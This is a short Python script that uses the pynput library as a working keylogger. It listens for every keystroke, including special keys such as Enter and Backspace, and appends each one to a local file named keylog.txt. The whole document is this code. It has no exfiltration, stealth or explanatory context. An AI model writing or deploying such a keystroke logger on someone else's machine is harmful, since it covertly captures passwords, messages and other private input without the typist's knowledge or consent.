from pynput import keyboard

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)  # Handle special keys like backspace, enter, etc.
    with open("keylog.txt", "a") as logfile:
        logfile.write(char)

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Wait for the listener to finish
